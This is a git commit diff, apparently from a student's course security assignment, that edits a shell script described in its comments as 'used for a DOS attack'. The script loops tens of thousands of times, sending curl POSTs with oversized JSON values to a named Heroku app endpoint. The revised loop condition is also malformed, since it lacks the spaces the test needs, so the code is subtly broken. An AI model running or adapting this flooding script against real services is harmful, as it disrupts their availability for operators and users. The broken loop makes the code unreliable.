84ff008d78575c58d7ca4b36ddf574ab196b5bc6
George Brown <gbrown3593@gmail.com>
2014-04-27 15:38:06 -0400

    done with issues intro abstract, need to finish conclusion and add image

--- security/scripts/overflow.sh
+++ security/scripts/overflow.sh
@@ -1,7 +1,10 @@
-#!/bin/sh 
+#!/bin/bash 
+# George Brown, Comp 20 Assignment 5
+# Used for a DOS attack
+# Thanks to Siddhartha Prasad for helping me with this script
 i=0 
-while [ $i -lt 10000 ] 
+while [$i -lt 50000] 
 do 
-curl --data '{"username":"overflowing!!!!!!!!!!!!", "score":"999999999999999999999999999999999999999999999999999999", "grid":"xxxxxxxxxxxxxxx"}' http://sleepy-atoll-6532.herokuapp.com/submit.json -verbose -H "Content-Type: application/json" 
-i=$(($i+1)) 
-done 
+curl --data '{"username":"overflowing!!!!!!!!!!!!", "score":"999999999999999999999999999999999999999999999999999999", "grid":"xxxxxxxxxxxxxxx"}' http://sleepy-atoll-6532.herokuapp.com/submit.json -H "Content-Type: application/json" 
+i=$(($i+1))
+done
